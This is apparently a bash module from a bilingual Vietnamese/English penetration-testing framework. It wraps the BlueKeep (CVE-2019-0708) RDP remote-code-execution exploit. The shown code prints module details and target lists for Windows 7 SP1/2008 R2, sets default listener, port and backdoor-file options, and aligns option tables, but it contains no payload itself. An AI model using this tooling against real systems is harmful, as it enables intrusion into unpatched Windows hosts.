function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: CVE-2019-0708 | Lỗ hổng thực thi mã từ xa RDP
     Mô-đun: exploit/windows/rdp/CVE-2019-0708_rdp_rce
   Nền tảng: Windows
  Kiến trúc: 
  Quyền hạn: Có
    Loại mã: Python & Metasploit(Ruby)
    Công bố: 14/05/2019

Cung cấp bởi:
  Sean Dillon <sean.dillon@risksense.com>
  Ryan Hanson
  OJ Reeves <oj@beyondbinary.io>
  Brent Cook <bcook@rapid7.com>
!
platform
	if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
cat << !

Mục tiêu khả dụng:
   Id  Tên
   --  ----
   0   None
!
	else	
cat << !

Mục tiêu khả dụng:
   Id  Tên
   --  ----
   0   Tự động điều chỉnh mục tiêu thông qua lấy dấu tay
   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
   5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
   6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
   7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)
!
	fi
module_compare
cat << !
Hỗ trợ quét lỗ hổng:
   Có

Miêu tả:
    BlueKeep (CVE-2019-0708) là một lỗ hổng trong giao thức điều khiển máy tính từ xa (RDP).
    Bằng những dòng mã được chế tạo đặc biệt chứa shellcode, trình điều khiển RDP TermDD.sys
    xử lý không đúng các liên kết với kênh MS_T120. 
    Kênh MS_T120 ngắt kết nối không đúng định dạng dẫn đến việc sử dụng miễn phí (use-after-free).
    Việc khai thác có thể thất bại và làm crash hệ thống đích.

Tham khảo:
    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708
    https://www.cvedetails.com/cve/CVE-2019-0708/
    https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708
    https://www.exploit-db.com/exploits/47416
    https://www.malwaretech.com/2019/09/bluekeep-a-journey-from-dos-to-rce-cve-2019-0708.html

Còn được biết là:
   BlueKeep

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: CVE-2019-0708 | RDP Remote Code Execution Vulnerability
     Module: exploit/windows/rdp/CVE-2019-0708_rdp_rce
   Platform: Windows
       Arch: 
 Privileged: Yes
  Code type: Python & Metasploit(Ruby)
  Disclosed: 14/05/2019

Provided by:
  Sean Dillon <sean.dillon@risksense.com>
  Ryan Hanson
  OJ Reeves <oj@beyondbinary.io>
  Brent Cook <bcook@rapid7.com>
!
platform
	if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
cat << !

Available targets:
   Id  Name
   --  ----
   0   None
!
	else
cat << !

Available targets:
   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting
   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
   5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
   6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
   7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)
!
	fi
module_compare
cat << !
Vulnerability scanning support:
   Yes

Description:
    BlueKeep (CVE-2019-0708) is a vulnerability in the Remote Desktop Protocol (RDP).
    By specially crafted lines of code containing shellcode, the RDP TermDD.sys driver 
    improperly handles binds to channel MS_T120.
    The MS_T120 channel disconnects in the wrong format to cause use-after-free.
    The exploit may fail and crash the target system.

References:
    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708
    https://www.cvedetails.com/cve/CVE-2019-0708/
    https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708
    https://www.exploit-db.com/exploits/47416
    https://www.malwaretech.com/2019/09/bluekeep-a-journey-from-dos-to-rce-cve-2019-0708.html
    
Also known as:
  Bluekeep

!
fi

}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
	platform="msf"
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'` > /dev/null 2>&1
	lport="4444"
	rhost=""
	rport="3389"
	rdp_client_ip="192.168.0.100"
	rdp_client_name="ethdev"
	rdp_domain=""
	rdp_user=""
	target="0"

	backdoor_file=""
	publichost=`dig +short myip.opendns.com @resolver1.opendns.com`

	rdp_user_lenght=18
	rdp_domain_lenght=18
	rhost_lenght=18
	backdoor_file_lenght=18
	publichost_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"

if [[ $rhost_lenght -le 18 ]]; then
	rhost_lenght=18
fi
	if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
		if [[ $publichost_lenght -le 18 ]]; then
			publichost_lenght=18
		fi
		if [[ $backdoor_file_lenght -le 18 ]]; then
			backdoor_file_lenght=18
		fi
		plus_strings=`expr $backdoor_file_lenght + $rhost_lenght + $publichost_lenght`
	else
		if [[ $rdp_user_lenght -le 18 ]]; then
			rdp_user_lenght=18
		fi
		if [[ $rdp_domain_lenght -le 18 ]]; then
			rdp_domain_lenght=18
		fi
		plus_strings=`expr $rdp_user_lenght + $rhost_lenght + $rdp_domain_lenght`
	fi
	if  [[ "$plus_strings" -le 54 ]]; then
			module1
	else
			module2
	fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "platform" ]] || [[ "$new_processing_variables" = "PLATFORM" ]] || [[ "$new_processing_variables" = "Platform" ]]; then
			if [[ "$module_set" = "python" ]] || [[ "$module_set" = "PYTHON" ]] || [[ "$module_set" = "Python" ]] || [[ "$module_set" = "py" ]] || [[ "$module_set" = "Py" ]] || [[ "$module_set" = "0" ]]; then
				unset platform
				platform="$module_set"
			elif [[ "$module_set" = "msf" ]] || [[ "$module_set" = "MSF" ]] || [[ "$module_set" = "Msf" ]] || [[ "$module_set" = "metasploit" ]] || [[ "$module_set" = "Metasploit" ]] || [[ "$module_set" = "1" ]]; then
				unset platform
				platform="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "backdoor_file" ]] || [[ "$new_processing_variables" = "BACKDOOR_FILE" ]] || [[ "$new_processing_variables" = "Backdoor_file" ]]; then
			unset backdoor_file
			backdoor_file=`echo "$module_set" | cut -d "'" -f2` > /dev/null 2>&1
			################ bỏ đi ký tự cuối ####################
			backdoor_name=${backdoor_file##*/}
			backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
			type_file=`echo $file_name | cut -d'.' -f2 | sed 's/./\U&/g'` > /dev/null 2>&1
			if [[ $backdoor_file_lenght -le 18 ]]; then
				backdoor_file_lenght=18
			fi
		elif [[ "$new_processing_variables" = "publichost" ]] || [[ "$new_processing_variables" = "PUBLICHOST" ]] || [[ "$new_processing_variables" = "Publichost" ]]; then
			unset publichost
			publichost="$module_set"
			publichost_lenght=`echo $publichost | awk '{print length}'`
			if [[ $publichost_lenght -le 18 ]]; then
				publichost_lenght=18
			fi

		elif [[ "$new_processing_variables" = "rhost" ]] || [[ "$new_processing_variables" = "RHOST" ]] || [[ "$new_processing_variables" = "Rhost" ]]; then
			unset rhost
			rhost="$module_set"
			rhost_lenght=`echo $rhost | awk '{print length}'`
			if [[ $rhost_lenght -le 18 ]]; then
				rhost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "rport" ]] || [[ "$new_processing_variables" = "RPORT" ]] || [[ "$new_processing_variables" = "Rport" ]]; then
			unset rport
			rport="$module_set"
		elif [[ "$new_processing_variables" = "rdp_client_ip" ]] || [[ "$new_processing_variables" = "RDP_CLIENT_IP" ]] || [[ "$new_processing_variables" = "Rdp_client_ip" ]]; then
			unset rdp_client_ip
			rdp_client_ip="$module_set"
		elif [[ "$new_processing_variables" = "rdp_client_name" ]] || [[ "$new_processing_variables" = "RDP_CLIENT_NAME" ]] || [[ "$new_processing_variables" = "Rdp_client_name" ]]; then
			unset rdp_client_name
			rdp_client_name="$module_set"
		elif [[ "$new_processing_variables" = "rdp_domain" ]] || [[ "$new_processing_variables" = "RDP_DOMAIN" ]] || [[ "$new_processing_variables" = "Rdp_domain" ]]; then
			unset rdp_domain
			rdp_domain="$module_set"
			rdp_domain_lenght=`echo $rdp_domain | awk '{print length}'`
			if [[ $rdp_domain_lenght -le 18 ]]; then
				rdp_domain_lenght=18
			fi
		elif [[ "$new_processing_variables" = "rdp_user" ]] || [[ "$new_processing_variables" = "RDP_USER" ]] || [[ "$new_processing_variables" = "Rdp_user" ]]; then
			unset rdp_user
			rdp_user="$module_set"
			rdp_user_lenght=`echo $rdp_user | awk '{print length}'`
			if [[ $rdp_user_lenght -le 18 ]]; then
				rdp_user_lenght=18
			fi
		elif [[ "$new_processing_variables" = "target" ]] || [[ "$new_processing_variables" = "TARGET" ]] || [[ "$new_processing_variables" = "Target" ]]; then
			if [[ "$module_set" = "0" ]] || [[ "$module_set" = "1" ]] || [[ "$module_set" = "2" ]] || [[ "$module_set" = "3" ]] || [[ "$module_set" = "4" ]] || [[ "$module_set" = "5" ]] || [[ "$module_set" = "6" ]] || [[ "$module_set" = "7" ]]; then
				unset target
				target="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		fi
}

##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
	integer=`expr 20 - $rhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rhost=$rhost$myvar
unset_value
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
	integer=`expr 20 - $rport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rport=$rport$myvar
unset_value
rdp_client_ip=`echo $rdp_client_ip`
rdp_client_ip_lenght=`echo $rdp_client_ip | awk '{print length}'`
	integer=`expr 20 - $rdp_client_ip_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rdp_client_ip=$rdp_client_ip$myvar
unset_value
rdp_client_name=`echo $rdp_client_name`
rdp_client_name_lenght=`echo $rdp_client_name | awk '{print length}'`
	integer=`expr 20 - $rdp_client_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rdp_client_name=$rdp_client_name$myvar
unset_value
rdp_domain=`echo $rdp_domain`
rdp_domain_lenght=`echo $rdp_domain | awk '{print length}'`
	integer=`expr 20 - $rdp_domain_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rdp_domain=$rdp_domain$myvar
unset_value
rdp_user=`echo $rdp_user`
rdp_user_lenght=`echo $rdp_user | awk '{print length}'`
	integer=`expr 20 - $rdp_user_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rdp_user=$rdp_user$myvar
unset_value

backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
	integer=`expr 20 - $backdoor_file_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	backdoor_file=$backdoor_file$myvar
unset_value
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
	integer=`expr 20 - $publichost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publichost=$publichost$myvar
unset_value
module_banner_1
}
function module2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
	if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
		rdp_domain=`echo $rdp_domain`
		rdp_domain_lenght=`echo $rdp_domain | awk '{print length}'`
		rdp_user=`echo $rdp_user`
		rdp_user_lenght=`echo $rdp_user | awk '{print length}'`

		subtract_compare1=`expr $rdp_domain_lenght - $rdp_user_lenght`
		subtract_compare2=`expr $rhost_lenght - $rdp_user_lenght`
		subtract_compare3=`expr $rhost_lenght - $rdp_domain_lenght`

		if [[ $subtract_compare1 -gt 0 ]]; then
			if [[ $subtract_compare3 -lt 0 ]]; then
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				rdp_domain=$rdp_domain$myvar
			unset_value
				subtract_compare_value=`expr $rdp_domain_lenght - $rdp_user_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rdp_user=$rdp_user$myvar
			unset_value
				subtract_compare_value=`expr $rdp_domain_lenght - $rhost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
			
				greater_value=$rdp_domain_lenght
			else 
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $rdp_domain_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rdp_domain=$rdp_domain$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $rdp_user_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rdp_user=$rdp_user$myvar
			unset_value
			
				greater_value=$rhost_lenght
			fi
		elif [[ $subtract_compare2 -gt 0 ]]; then
			if [[ $subtract_compare3 -gt 0 ]]; then
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $rdp_user_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rdp_user=$rdp_user$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $rdp_domain_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rdp_domain=$rdp_domain$myvar
			unset_value
			
				greater_value=$rhost_lenght
			else 
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				rdp_domain=$rdp_domain$myvar
			unset_value
				subtract_compare_value=`expr $rdp_domain_lenght - $rhost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $rdp_domain_lenght - $rdp_user_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rdp_user=$rdp_user$myvar
			unset_value
			
				greater_value=$rdp_domain_lenght
			fi
		else
			if [[ $subtract_compare2 -lt 0 ]]; then
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				rdp_user=$rdp_user$myvar
			unset_value
				subtract_compare_value=`expr $rdp_user_lenght - $rhost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $rdp_user_lenght - $rdp_domain_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rdp_domain=$rdp_domain$myvar
			unset_value
			
				greater_value=$rdp_user_lenght
			else 
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $rdp_domain_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rdp_domain=$rdp_domain$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $rdp_user_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rdp_user=$rdp_user$myvar
			unset_value
			
				greater_value=$rhost_lenght
			fi
		fi
		rdp_client_ip=`echo $rdp_client_ip`
		rdp_client_ip_lenght=`echo $rdp_client_ip | awk '{print length}'`
		subtract_compare_value=`expr $greater_value - $rdp_client_ip_lenght + 3`	
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
			done
			rdp_client_ip=$rdp_client_ip$myvar
		unset_value
		rdp_client_name=`echo $rdp_client_name`
		rdp_client_name_lenght=`echo $rdp_client_name | awk '{print length}'`
		subtract_compare_value=`expr $greater_value - $rdp_client_name_lenght + 3`	
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
			done
			rdp_client_name=$rdp_client_name$myvar
		unset_value
	else
		publichost=`echo $publichost`
		publichost_lenght=`echo $publichost | awk '{print length}'`
		backdoor_file=`echo $backdoor_file`
		backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`

		subtract_compare1=`expr $publichost_lenght - $backdoor_file_lenght`
		subtract_compare2=`expr $rhost_lenght - $backdoor_file_lenght`
		subtract_compare3=`expr $rhost_lenght - $publichost_lenght`

		if [[ $subtract_compare1 -gt 0 ]]; then
			if [[ $subtract_compare3 -lt 0 ]]; then
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				publichost=$publichost$myvar
			unset_value
				subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				backdoor_file=$backdoor_file$myvar
			unset_value
				subtract_compare_value=`expr $publichost_lenght - $rhost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
			
				greater_value=$publichost_lenght
			else 
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $publichost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				publichost=$publichost$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $backdoor_file_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				backdoor_file=$backdoor_file$myvar
			unset_value
			
				greater_value=$rhost_lenght
			fi
		elif [[ $subtract_compare2 -gt 0 ]]; then
			if [[ $subtract_compare3 -gt 0 ]]; then
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $backdoor_file_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				backdoor_file=$backdoor_file$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $publichost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				publichost=$publichost$myvar
			unset_value
			
				greater_value=$rhost_lenght
			else 
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				publichost=$publichost$myvar
			unset_value
				subtract_compare_value=`expr $publichost_lenght - $rhost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				backdoor_file=$backdoor_file$myvar
			unset_value
			
				greater_value=$publichost_lenght
			fi
		else
			if [[ $subtract_compare2 -lt 0 ]]; then
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				backdoor_file=$backdoor_file$myvar
			unset_value
				subtract_compare_value=`expr $backdoor_file_lenght - $rhost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $backdoor_file_lenght - $publichost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				publichost=$publichost$myvar
			unset_value
			
				greater_value=$backdoor_file_lenght
			else 
				integer=3
				for (( i = 0 ; i < $integer; i++ )) do
					myvar=$myvar$none
				done
				rhost=$rhost$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $publichost_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				publichost=$publichost$myvar
			unset_value
				subtract_compare_value=`expr $rhost_lenght - $backdoor_file_lenght + 3`		
				for (( i = 0 ; i < $subtract_compare_value; i++ )) do
				myvar=$myvar$none
				done
				backdoor_file=$backdoor_file$myvar
			unset_value
			
				greater_value=$rhost_lenght
			fi
		fi
	fi
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $rport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	rport=$rport$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value
module_banner_2
}
function module_banner_1 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
attack_value=`echo $attack_type`
cat << !

Các tùy chọn của mô-đun (exploit/windows/rdp/CVE-2019-0708_rdp_rce):

   Tên       	    Thiết lập hiện tại     Yêu cầu   Miêu tả
   ----             ---------------        --------  -----------
   RHOST            $rhost $yes        Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT            $rport $no     Cổng dịch vụ máy chủ RDP đang chạy.
!
	if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
cat << !
   RDP_CLIENT_IP    $rdp_client_ip $no     Địa chỉ IPv4 của máy khách để báo cáo trong khi kết nối.
   RDP_CLIENT_NAME  $rdp_client_name $no     Tên máy khách để báo cáo trong khi kết nối, không đặt = ngẫu nhiên.
   RDP_DOMAIN       $rdp_domain $no     Tên miền máy khách để báo cáo trong khi kết nối.
   RDP_USER         $rdp_user $no     Tên người dùng để báo cáo trong khi kết nối, không đặt = ngẫu nhiên.

!
	else
		echo "chua phat trien"
	fi
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
attack_value=`echo $attack_type`
cat << !

Module options (exploit/windows/rdp/CVE-2019-0708_rdp_rce):

   Name             Current Setting       Required  Description
   ----             ---------------       --------  -----------
   RHOST            $rhost $yes      Address or domain name of target server.
   RPORT            $rport $no	  The RDP server service port is running.
!
	if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
cat << !
   RDP_CLIENT_IP    $rdp_client_ip $no      The client IPv4 address to report during connect.
   RDP_CLIENT_NAME  $rdp_client_name $no	  The client computer name to report during connect, UNSET = random.
   RDP_DOMAIN       $rdp_domain $no	  The client domain name to report during connect.
   RDP_USER         $rdp_user $no	  The username to report during connect, UNSET = random.

!
	else
		echo "chua phat trien"
	fi
fi	
}
function module_banner_2 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
attack_value=`echo $attack_type`
cat << !

Các tùy chọn của mô-đun (exploit/windows/rdp/CVE-2019-0708_rdp_rce):

   Tên              Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----             ---------------${_characters1}--------  -----------
   RHOST            $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu
   RPORT            $rport $no      Cổng dịch vụ máy chủ RDP đang chạy.
!
	if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
cat << !
   RDP_CLIENT_IP    $rdp_client_ip $no      Địa chỉ IPv4 của máy khách để báo cáo trong khi kết nối.
   RDP_CLIENT_NAME  $rdp_client_name $no      Tên máy khách để báo cáo trong khi kết nối, không đặt = ngẫu nhiên.
   RDP_DOMAIN       $rdp_domain $no      Tên miền máy khách để báo cáo trong khi kết nối.
   RDP_USER         $rdp_user $no      Tên người dùng để báo cáo trong khi kết nối, không đặt = ngẫu nhiên.

!
	else
		echo "chua phat trien"
	fi
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
attack_value=`echo $attack_type`
cat << !

Module options (exploit/windows/rdp/CVE-2019-0708_rdp_rce):

   Name             Current Setting${g_characters}Required  Description
   ----             ---------------${_characters2}--------  -----------
   RHOST            $rhost $yes      Address or domain name of target server.
   RPORT            $rport $no	  The RDP server service port is running.
!
	if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
cat << !
   RDP_CLIENT_IP    $rdp_client_ip $no      The client IPv4 address to report during connect.
   RDP_CLIENT_NAME  $rdp_client_name $no	  The client computer name to report during connect, UNSET = random.
   RDP_DOMAIN       $rdp_domain $no	  The client domain name to report during connect.
   RDP_USER         $rdp_user $no	  The username to report during connect, UNSET = random.

!
	else
		echo "chua phat trien"
	fi
fi
		
}
function show_platforms {
if [ "$language" = "VN" ]; then
echo -e """
Nền tảng mã khai thác:

   Id  Tên
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
elif [ "$language" = "EN" ]; then
echo -e """
Exploit code platform:

   Id  Name
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
fi
}
function platform {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	if [ "$language" = "VN" ]; then
echo -ne """
Nền tảng được chọn:

   Id  Tên
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
	elif [ "$language" = "EN" ]; then
echo -ne """
Platform selected:

   Id  Name
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
	fi
else
	if [ "$language" = "VN" ]; then
echo -ne """
Nền tảng được chọn:

   Id  Tên
   --  ----
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
	elif [ "$language" = "EN" ]; then
echo -ne """
Platform selected:

   Id  Name
   --  ----
   1   ${red}Metasploit${RESET}(${red}Ruby${RESET})
"""
	fi
fi
}
################# targets ###################
#############################################
function show_targets {
if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
	if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Tự động điều chỉnh mục tiêu thông qua lấy dấu tay
   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
   5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
